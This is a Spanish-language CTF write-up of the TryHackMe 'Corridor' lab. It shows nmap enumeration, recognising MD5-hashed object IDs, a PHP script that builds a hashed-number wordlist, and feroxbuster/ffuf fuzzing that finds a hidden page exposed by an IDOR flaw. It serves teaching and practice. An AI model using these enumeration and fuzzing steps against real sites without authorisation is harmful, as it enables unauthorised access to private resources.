---
title: Try Hack Me - Corridor - Writeup
date: 2022-10-10 10:30:00 +0800
categories: ["Try Hack Me"]
tags: [thm, writeups]     # TAG names should always be lowercase
---

En esta guía vamos a resolver el room [Corridor](https://tryhackme.com/room/corridor), una sala sencilla disponible en [THM](https://tryhackme.com) y creada por varios autores en la que practicaremos los rudimentos de IDOR (Insecure Direct Object Reference), un tipo de vulnerabilidad que se produce cuando una aplicación permite al usuario acceder directamente a recursos (archivos, funciones, etc) a través de una consulta implementada sin el necesario control de acceso.

Dentro música.

## Introducción

La descripción del room nos dice lo siguiente:

<em>Te has encontrado en un pasillo extraño. ¿Puedes encontrar el camino de vuelta al lugar por el que viniste?</em>

<em>En este desafío, explorarás las posibles vulnerabilidades de IDOR. Examina los puntos finales de la URL a los que accedes mientras navegas por el sitio web y anota los valores hexadecimales que encuentres (se parecen mucho a un hash, ¿verdad?). Esto podría ayudarle a descubrir ubicaciones del sitio web a las que no se esperaba que accediera.</em>

La descripción nos da bastantes pistas (IDOR, URL, valores hexadecimales). Empezamos enumerando con **nmap** para saber en qué puerto está corriendo el servidor web.

## Enumeración


```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Corridor]
└─$ nmap -A 10.10.105.230
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 12:32 CEST
Nmap scan report for 10.10.105.230
Host is up (0.037s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.10.2)
|_http-title: Corridor
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
```

Abrimos un navegador y cargamos la IP.

![](/assets/posts/20221000/img00.png)

Echamos un ojo al código fuente de la página y vemos que se trata de una imagen mapeada.

```
<img src="/static/img/corridor.png" usemap="#image-map">

    <map name="image-map">
        <area target="" alt="c4ca4238a0b923820dcc509a6f75849b" title="c4ca4238a0b923820dcc509a6f75849b" href="c4ca4238a0b923820dcc509a6f75849b" coords="257,893,258,332,325,351,325,860" shape="poly">
        <area target="" alt="c81e728d9d4c2f636f067f89cc14862c" title="c81e728d9d4c2f636f067f89cc14862c" href="c81e728d9d4c2f636f067f89cc14862c" coords="469,766,503,747,501,405,474,394" shape="poly">
        <area target="" alt="eccbc87e4b5ce2fe28308fd9f2a7baf3" title="eccbc87e4b5ce2fe28308fd9f2a7baf3" href="eccbc87e4b5ce2fe28308fd9f2a7baf3" coords="585,698,598,691,593,429,584,421" shape="poly">
        <area target="" alt="a87ff679a2f3e71d9181a67b7542122c" title="a87ff679a2f3e71d9181a67b7542122c" href="a87ff679a2f3e71d9181a67b7542122c" coords="650,658,644,437,658,652,655,437" shape="poly">
        <area target="" alt="e4da3b7fbbce2345d7772b0674a318d5" title="e4da3b7fbbce2345d7772b0674a318d5" href="e4da3b7fbbce2345d7772b0674a318d5" coords="692,637,690,455,695,628,695,467" shape="poly">
        <area target="" alt="1679091c5a880faf6fb5e6087eb1b2dc" title="1679091c5a880faf6fb5e6087eb1b2dc" href="1679091c5a880faf6fb5e6087eb1b2dc" coords="719,620,719,458,728,471,728,609" shape="poly">
        <area target="" alt="8f14e45fceea167a5a36dedd4bea2543" title="8f14e45fceea167a5a36dedd4bea2543" href="8f14e45fceea167a5a36dedd4bea2543" coords="857,612,933,610,936,456,852,455" shape="poly">
        <area target="" alt="c9f0f895fb98ab9159f51fd0297e236d" title="c9f0f895fb98ab9159f51fd0297e236d" href="c9f0f895fb98ab9159f51fd0297e236d" coords="1475,857,1473,354,1537,335,1541,901" shape="poly">
        <area target="" alt="45c48cce2e2d7fbdea1afc51c7c6ad26" title="45c48cce2e2d7fbdea1afc51c7c6ad26" href="45c48cce2e2d7fbdea1afc51c7c6ad26" coords="1324,766,1300,752,1303,401,1325,397" shape="poly">
        <area target="" alt="d3d9446802a44259755d38e6d163e820" title="d3d9446802a44259755d38e6d163e820" href="d3d9446802a44259755d38e6d163e820" coords="1202,695,1217,704,1222,423,1203,423" shape="poly">
        <area target="" alt="6512bd43d9caa6e02c990b0a82652dca" title="6512bd43d9caa6e02c990b0a82652dca" href="6512bd43d9caa6e02c990b0a82652dca" coords="1154,668,1146,661,1144,442,1157,442" shape="poly">
        <area target="" alt="c20ad4d76fe97759aa27a0c99bff6710" title="c20ad4d76fe97759aa27a0c99bff6710" href="c20ad4d76fe97759aa27a0c99bff6710" coords="1105,628,1116,633,1113,447,1102,447" shape="poly">
        <area target="" alt="c51ce410c124a10e0db5e4b97fc2af39" title="c51ce410c124a10e0db5e4b97fc2af39" href="c51ce410c124a10e0db5e4b97fc2af39" coords="1073,609,1081,620,1082,459,1073,463" shape="poly">
    </map>
```

Si hacemos click en cada una de las puertas nos carga la vista de una especie de habitación vacía.

Teniendo en cuenta el formato de la cadena y la descripción del room inferimos que puede tratarse de un hash. Tiramos de [Crackstation](https://crackstation.net/) pasándole la lista de hashes a ver qué nos dice.

![](/assets/posts/20221000/img01.png)

OK, cada una de las cadenas es un hash md5 de los números 1 a 13, uno por cada puerta.

El siguiente paso es intentar pasar otros valores hasheados como parámetro al servidor (el principio detrás de una vulnerabilidad de tipo IDOR) y ver qué nos responde. Vamos a probar con el hash md5 correspondiente al número 14. Para calcularlo podemos utilizar la línea de comando (`echo -n 14 | md5sum`) o cualquier conversor online como [éste](https://www.md5.cz/)

La URL correspondiente al valor 14 nos quedaría así:

`http://10.10.105.230/aab3238922bcc25a6f606eb525ffdc56`

Probamos y el servidor nos devuelve un 404.

Bien. Aquí se abre un mundo de posibilidades. Qué valores es necesario pasar como parámetro para obtener una respuesta válida ? Vamos probando valores de manera manual ? Qué tipos de valores ? Hasheamos un diccionario ? Creamos el nuestro ?

Tomando como referencia lo que sabemos, y por comenzar en alguna dirección, vamos a probar a fuzzear la URL pasándole valores númericos hasheados con md5 desde un diccionario creado por nosotros mismos ... y ver qué pasa.

Para ello, lo primero es crear nuestro diccionario. En mi caso utilizo el siguiente script en PHP para resolver la tarea. 

```
<?php
$archivo = fopen("md5list.txt", "w") or die("Se produjo un error al crear el archivo");
for ($i = -30; $i <= 30; $i++) {
	if ($i < 2 || $i > 13) fwrite($archivo, md5($i) . PHP_EOL);
}
fclose($archivo);
?>
```

Qué estamos haciendo aquí ?

* Creamos un fichero en modo escritura (*w*) con el nombre `md5list.txt`.
* En un bucle *for* recorremos los enteros desde el valor *-30* a *30*.
* Excluimos mediante la sentencia *if* los valores del *2* al *13* que ya conocemos (en mi caso he dejado el *1* a modo de control) y escribimos en el archivo el valor md5 correspondiente en una línea nueva.
* Cerramos el fichero que hemos creado y escrito.

Guardamos el código anterior en un fichero con el nombre `listgen.php` y lo corremos desde el terminal.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Corridor]
└─$ php -f listgen.php
```

Confirmamos que esta todo OK.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Corridor]
└─$ cat md5list.txt
8c5ef576c66349bb871d35994ec50448
b9ea889c6fc3fb2b4c343d7400734856
74c803ab28302f53009c2208e8c20936
7ab4babdd6b87640e9ccccf7055324cb
55ef51c35b7e218b34dd47605cfe5d6a
0f4b2d50114d8d93c99bf321b2ea1220
66d8c0f4ab3c3681ff3f9093b05136a6
4e1ed310e8b3553d266bd619949ec01c
29fe3cef22985ae07803bf456b8947dc
fe9bea92980bb30c7fb9cc3c33c99204
1b0fd9efa5279c4203b7c70233f86dbf
252e691406782824eec43d7eadc3d256
a8d2ec85eaf98407310b72eb73dda247
74687a12d3915d3c4d83f1af7b3683d5
596a3d04481816330f07e4f97510c28f
47c1b025fa18ea96c33fbb6718688c0f
0267aaf632e87a63288a08331f22c7c3
b3149ecea4628efd23d2f86e5a723472
5d7b9adcbe1c629ec722529dd12e5129
6bb61e3b7bce0931da574d19d1d82c88
cfcd208495d565ef66e7dff9f98764da
c4ca4238a0b923820dcc509a6f75849b
aab3238922bcc25a6f606eb525ffdc56
9bf31c7ff062936a96d3c8bd1f8f2ff3
c74d97b01eae257e44aa9d5bade97baf
70efdf2ec9b086079795c442636b55fb
6f4922f45568161a8cdf4ad2299f6d23
1f0e3dad99908345f7439f8ffabdffc4
98f13708210194c475687be6106a3b84
```

Con nuestro diccionario disponible procedemos a fuzzear la URL.

Probamos con **feroxbuster** filtrando las respuestas por el código 200 del servidor.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Corridor]
└─$ feroxbuster -u http://10.10.105.230/ -w md5list.txt --status-codes 200

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.105.230/
 🚀  Threads               │ 50
 📖  Wordlist              │ md5list.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       36l      122w     3213c http://10.10.105.230/
200      GET       24l       33w      632c http://10.10.105.230/c4ca4238a0b923820dcc509a6f75849b
200      GET       34l       47w      797c http://10.10.105.230/<EDITADO>
[####################] - 0s        30/30      0s      found:3       errors:0      
[####################] - 0s        30/30      77/s    http://10.10.105.230/

```

El primer valor (*c4ca4238a0b923820dcc509a6f75849b*) se corresponde con el hash md5 del valor *1* que incluimos en el diccionario como control. El otro es nuevo, y toca probar ;)


Otra posibilidad es utilizar **ffuf**. Os copio debajo el comando y la salida, si bien el resultado es el mismo.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Corridor]
└─$ ffuf -u http://10.10.105.230/FUZZ -w md5list.txt -c -t 100 -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.105.230/FUZZ
 :: Wordlist         : FUZZ: md5list.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200
________________________________________________

<EDITADO> [Status: 200, Size: 797, Words: 121, Lines: 34, Duration: 649ms]
c4ca4238a0b923820dcc509a6f75849b [Status: 200, Size: 632, Words: 72, Lines: 24, Duration: 728ms]
```

Cargamos la URL con el hash obtenido y accedemos al flag.

Espero que os haya resultado útil.

Un saludo y manteneros curiosos.